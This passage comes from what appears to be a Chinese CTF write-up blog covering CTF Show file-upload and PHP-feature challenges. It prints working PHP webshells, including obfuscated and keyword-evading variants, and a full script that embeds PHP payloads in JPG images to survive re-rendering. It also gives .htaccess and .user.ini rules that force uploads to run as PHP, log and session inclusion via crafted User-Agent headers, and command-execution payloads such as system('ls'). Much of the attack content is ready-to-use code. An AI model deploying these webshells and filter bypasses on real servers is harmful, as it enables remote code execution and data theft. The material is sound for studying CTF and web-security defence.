0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,&#x27;1.png&#x27;);?&gt; 结果生成 1.png ，其中包含 &lt;?=$_GET[0]($_POST[1]);?&gt; 然后访问图片，执行代码后，下载图片查看 因为在下载的时候，看到 url 是 download/?image= ，可能是文件包含，所以可以执行我们的命令 1.12 Web 165 — jpg 二次渲染 首先准备一张 jpg 图片上传，成功后下载回来，使用如下脚本处理，生成一个新的图片马，再次上传 查看，即文件包含，保存到本地打开即可 1&lt;?php $miniPayload = &quot;&lt;?=`tac f*`?&gt;&quot;; //这里改代码 if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125; //使用方法 php exp.php 1.jpg?&gt; 1.13 Web 166 — zip 文件上传 1# Content-Type: application/x-zip-compressed 将一句话木马后缀更改为 zip 上传即可，查看文件 1/upload/download.php?file=9643f09dfc5004a1dc73f4c025f084d2.zip 将代码更改即可 1.14 Web 167 — .htaccess1httpd 尝试 jpg 文件成功上传之后发现服务器是 Apache ，再根据提示，尝试上传 .htaccess 成功上传 1# 上传 111.png&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 之后访问 /upload/111.png 蚁剑连接即可 1.15 Web 168 — 免杀代码1基础免杀# 过滤了 eval , system , $_POST , $_GET 等 1# 可使用反引号&lt;?=`ls /var/www/html`?&gt; #flag.php flagaa.php images index.php js layui upload upload.php &lt;?=`cat /var/www/html/flagaa.php`?&gt; 1# 其它绕过方式 1&lt;?php // 使用时请删除此行, 连接密码: TyKPuntU ?&gt;&lt;?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode(&#x27;bw==&#x27;).base64_decode(&#x27;bQ==&#x27;).base64_decode(&#x27;ZQ==&#x27;),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode(&#x27;YQ==&#x27;).base64_decode(&#x27;bA==&#x27;).chr(060340/01154).chr(01041-0775).base64_decode(&#x27;cw==&#x27;).str_rot13(&#x27;b&#x27;).chr(01504-01327).base64_decode(&#x27;ZQ==&#x27;).chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode(&#x27;NjgxO&#x27;.&#x27;Tc7QG&#x27;.&#x27;V2QWw&#x27;.&#x27;oJF9Q&#x27;.&#x27;&#x27;.str_rot13(&#x27;G&#x27;).str_rot13(&#x27;1&#x27;).str_rot13(&#x27;A&#x27;).base64_decode(&#x27;VQ==&#x27;).str_rot13(&#x27;J&#x27;).&#x27;&#x27;.&#x27;&#x27;.chr(0x304-0x2d3).base64_decode(&#x27;Ug==&#x27;).chr(13197/249).str_rot13(&#x27;F&#x27;).base64_decode(&#x27;MQ==&#x27;).&#x27;&#x27;.&#x27;B1bnR&#x27;.&#x27;VXSk7&#x27;.&#x27;MjA0N&#x27;.&#x27;TkxOw&#x27;.&#x27;==&#x27;.&#x27;&#x27;));?&gt; 1&lt;?php$a = &quot;s#y#s#t#e#m&quot;;$b = explode(&quot;#&quot;,$a);$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];$c($_REQUEST[1]);?&gt; 1&lt;?php$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;$a($_REQUEST[1]);?&gt; 1&lt;?php$a=strrev(&#x27;metsys&#x27;);$a($_REQUEST[1]);?&gt; 1&lt;?php$a=$_REQUEST[&#x27;a&#x27;];$b=$_REQUEST[&#x27;b&#x27;];$a($b);?&gt; 1&lt;?=`$_REQUEST[1]`;?&gt;# 利用反引号执行系统命令 1&lt;?php $a=&#x27;syste&#x27;.&#x27;m&#x27;;($a)(&#x27;ls ../&#x27;);# 拼接 1&lt;?php$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;);# get传参 abs=system&amp;acos=ls# 数学函数 1.16 Web 169-170 — 日志包含（未过滤 log）1高级免杀 1# 前端做了 .zip 检查# 后端做了 Content-Type 检查 访问 1.php ，我们必须自己上传一个 .php 文件 1system(&#x27;ls ../&#x27;); 1system(&#x27;cat ../flagaa.php&#x27;); 二、总结 找到允许上传的文件类型，抓包 在 Content-Type 正确的情况下，首先尝试直接更改 后缀为 .php ，写入一句话木马 上述不允许的情况下，观察服务器类型，nginx 尝试 .user.ini ，Apache 尝试 .htaccess ```bash.user.iniauto_prepend_file=1.pngauto_prepend_file=testauto_prepend_file=/var/log/nginx/access.log123+ ```bash # .htaccessAddType application/x-httpd-php .png # 特定文件后缀当作 php 文件处理AddHandler php5-script php # 包含关键字的文件名当作 php 文件处理&lt;FilesMatch &quot;文件名&quot;&gt; # 特定文件名当作 php 文件处理SetHandler application/x-httpd-php&lt;/FilesMatch&gt;SetHandler application/x-httpd-php #所有文件后缀都当作 php 文件处理 .user.ini 注意该目录下是否已经含有 .php 文件 过滤 php 1# 大小写绕过# 短标签 过滤 [] 1# &#123;&#125; 绕过 过滤 分号 ; 1# 命令执行&lt;? system(&quot;nl ../f*&quot;)?&gt;&lt;?=(system(&#x27;nl ../f*&#x27;))?&gt;&lt;?= `nl ../*.p*`?&gt;&lt;?= `nl ../f*`?&gt;&lt;?=(system(&#x27;tac ../f*&#x27;))?&gt; 日志包含 1过滤 log Web 160# 上传 .user.iniauto_prepend_file=123.png# 上传 123.png，在其中进行拼接# nginx 服务器&lt;?=include&quot;/var/log/nginx/access.log&quot;?&gt;# 由于 log 被过滤，进行拼接&lt;?=include&quot;/var/l&quot;.&quot;og/nginx/access.l&quot;.&quot;og&quot;?&gt;# 访问 /upload/index.php 抓包在 User-Agent 中添加恶意代码 &lt;?php system(&#x27;cat ../flag.php&#x27;); ?&gt; ，访问 1未过滤 log Web 169 170# 上传 .user.iniauto_prepend_file=/var/log/nginx/access.log# 上传 .php 文件，同时 User-Agent 写入 代码 &lt;?php phpinfo(); ?&gt;&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt;内容随意# 访问，命令执行 .user.ini 上传不了？尝试文件头写入 1GIF89a 过滤 . Web 162-163 1# 即不能包含日志文件，则包含 session 文件# 上传 .user.iniGIF89aauto_prepend_file=test# 上传 testGIF89a&lt;?=include&quot;/tmp/sess_test&quot;?&gt;# 构造 POST 数据包&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://e2f78cd5-b2b8-40b9-8104-7dc18214350b.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# 任意上传文件，抓包修改，PHPSESSID=test，写入代码添入变量 Numbers 爆破# 访问 /upload/index.php 添入变量 Numbers 同时爆破 二次渲染 Web 164 165 1png 图片# 脚本生成图片上传，访问，命令执行 &lt;?=$_GET[0]($_POST[1]);?&gt;# 下载至本地查看（文件包含） 1jpg 图片# 直接上传 jpg 图片，下载回来，使用脚本处理，得到新的 jpg 图片，再次上传# 下载至本地查看（文件包含） 后缀类型不可猜测时，.zip 文件上传 Web 166 1# 上传 .zip 文件抓包 Content-Type: application/x-zip-compressed# 内容直接是恶意代码# 找到 .zip 文件路径，进行查看# 命令执行 免杀 Web 168 前端做后缀检测，后端做不同后缀的 Content-Type 检测 注意抓包后修改 Content-Type 为白名单","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-PHP特性","slug":"CTF-Show-PHP特性","date":"2021-10-01T11:15:08.000Z","updated":"2021-10-01T11:16:09.641Z","comments":true,"path":"2021/10/01/CTF-Show-PHP特性/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-PHP%E7%89%B9%E6%80%A7/","excerpt":"CTF Show PHP 特性篇。","text":"CTF Show PHP 特性篇。 一、CTF Show PHP特性1.1 Web 89 — intval 数组 [ ] 绕过12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 1?num[]=1 #数组绕过 1.2 Web 90 — intval 取整 — intval(‘4476sasaS’,0)===44761234567891011121314&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 12345678intval ( mixed $var [, int $base = 10 ] ) : intNote:如果 base 是 0，通过检测 var 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。 123456intval(&#x27;4476.0&#x27;)===4476 小数点 intval(&#x27;+4476.0&#x27;)===4476 正负号intval(&#x27;4476e0&#x27;)===4476 科学计数法intval(&#x27;0x117c&#x27;)===4476 16进制intval(&#x27;010574&#x27;)===4476 8进制intval(&#x27; 010574&#x27;)===4476 8进制+空格 123if(intval(&#x27;4476sasaS&#x27;,0)===4476)&#123; echo &#x27;123&#x27;;&#125; 1?num=4476asd 1.3 Web 91 — 正则绕过 — /m 换行匹配1234567891011121314151617&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 1# 解析换行之后要匹配到 php不换行不能匹配到 php 1i 不区分(ignore)大小写m多(more)行匹配若存在换行\\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配$str = &quot;abc\\nabc&quot;;$preg = &quot;/^abc$/m&quot;;preg_match($preg, $str,$matchs);这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。s特殊字符圆点 . 中包含换行符默认的圆点 . 是匹配除换行符 \\n 之外的任何单字符，加上s之后, .包含换行符$str = &quot;abggab\\nacbs&quot;;$preg = &quot;/b./s&quot;;preg_match_all($preg, $str,$matchs);这样匹配到的有三个 bg b\\n bsA强制从目标字符串开头匹配;D如果使用$限制结尾字符,则不允许结尾有换行; e配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; 1# 直接使用换行符号分割即可# %0a 是 换行符?cmd=%0aphp 1.4 Web 92 — intval 可解析十六进制、八进制1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=0x117c #十六进制 Hex?num=010574 #八进制 oct?num=%20010574# ?num=4476sqs 不行，由于 $num==4476 1.5 Web 93 — 八进制不含字母，十六进制含字母1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 1?num=010574 #oct 1.6 Web 94 — 正则绕过 — %20 %0a1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1#0在其中的位置不能是0，即最开始，即不能以0开头?num=%0a010574?num=4476.0?num=%20010574 1.7 Web 95 — 正则绕过1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 1?num=%0a010574?num=%20010574?num=+010574 1.8 Web 96 — 路径书写1&lt;?php highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 1?u=./flag.php #路径?u=/var/www/html/flag.php?u=php://filter/resource=flag.php 1.9 Web 97 — md5 数组 [ ] 绕过 — if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))1&lt;?php include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; 1a[]=1&amp;b[]=2 1.10 Web 98 — 三目运算符、变量覆盖1&lt;?php include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 1#三目运算符以及变量覆盖若GET传参，POST值将覆盖GET值 1get传参：?flag=1post传参：?HTTP_FLAG=flag 1.11 Web 99 — file_put_contents1&lt;?php highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 1当没有第三个参数时，in_array之中的比较与 == 一致当第三个参数为 true 时，in_array之中的比较与 === 一致$allow = array(1,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型不同，首先转换，返回 true$allow = array(&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);var_dump(in_array(&#x27;1.php&#x27;,$allow));#类型一致，直接比较，返回false 1# payload?n=1.phpcontent=&lt;?php @eval($_POST[&#x27;a&#x27;]); ?&gt; 访问 /1.php 1.12 Web 100 — eval(“$v2(‘ctfshow’)$v3”);1&lt;?php highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 测试： 1&lt;?phpvar_dump(true and true and false); // falsevar_dump(true and false and false);// falsevar_dump(true &amp;&amp; true &amp;&amp; false);// falsevar_dump(true &amp;&amp; false &amp;&amp; false);// false$a=true and false and false;var_dump($a); // true$b = true &amp;&amp; false &amp;&amp; false;var_dump($b); //false$c = true &amp; false &amp; false;var_dump($c); //bool(0) 1&lt;?php$a=true and false and false;var_dump($a); // trueif($a === true and false and false)&#123; echo &#x27;111&#x27;; //不输出&#125; 1&lt;?php$a=false and true and true;var_dump($a); if($a == false and true and true)&#123; echo &#x27;111&#x27;; &#125;//bool(false) 111 11. if($v0)绕过：v1 是数字2. v2 不能有分号，那么无法使用 命令执行函数，那么使用 ``3. 使用注释将 v3 注释掉，相当于把 (&#x27;ctfshow&#x27;) 注释掉4. 注意，v3 一定要写上 ; 1# payload?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=?&gt;&lt;?php echo `cat ctfshow.php`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=-system(&#x27;ls&#x27;)-&amp;v3=-1;?v1=1&amp;v2=echo&amp;v3=;system(&#x27;ls&#x27;); 构造成下面的感觉 查 ctfshow.php 试试 其中，0x2d 是 - 1.13 Web 101 — ReflectionClass 关于一个类的反射http://www.thinkphp.cn/code/4863.html 1修补100题非预期,替换0x2d 1&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; 上面的 v2 构造的符号 被过滤 构造 eval(echo new ReflectionClass(‘ctfshow’)); 1?v1=1&amp;v2=echo new ReflectionClass&amp;v3=; 1.14 Web 1021&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 1 1.15 Web 1031 1.16 Web 104 — shal() 数组 [ ] 绕过1换个姿势 1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 1?v1=1?v2=1 1?v1[]=1?v2[]=2 1aaroZmOkaaK1STfYaaO8zKZFaa3OFF9m 1.17 Web 105 — 变量覆盖1&lt;?php highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;你还想要flag嘛？ 1$$key=$$value; #变量覆盖，将值作为变量赋给键作为变量，如果传入，?suces=flag，即相当于 $suces=$flag，即将$flag的值赋给$suces，所以我只需要想办法 输出 $suces 即可 可以看到，仅仅传入以上内容，会显示 $error 报错，我们可以通过 POST传参，将 $flag 的值赋给 $error 即可 思考 通过 die(suces) 1get: suces=flagpost: flag= 通过 die(error) 1get: suces=flagpost: error=suces 1.15 Web 106 — shal() 数组 [ ] 绕过1&lt;?php highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 1v1[]=1v2[]=2 1.16 Web 107 — parse_str()1&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 1#parse_str($v1,$v2);把$1字符串解析到变量 $2当中，以数组形式get: ?v3=123456post: v1=flag=e10adc3949ba59abbe56e057f20f883e 1.17 Web 108 — ereg() 截断漏洞1&lt;?php highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt;error 1#strrev()反转字符串#intval()获取变量整数值#0x36d 的十进制是 877 1ereg() 存在00截断漏洞，即%00之后的内容不会进行匹配函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配 1?c=sds%00778 1.18 Web 109 — $v1($v2()) 内置类1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 1#随便找个php中的内置类并且可以直接echo输出的就可以ExceptionReflectionClass?v1=ReflectionClass&amp;v2=system(&#x27;ls&#x27;)?v1=Exception&amp;v2=system(&#x27;ls&#x27;)?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=av1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;) 1.19 Web 110 — new $v1($v2())1&lt;?php highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;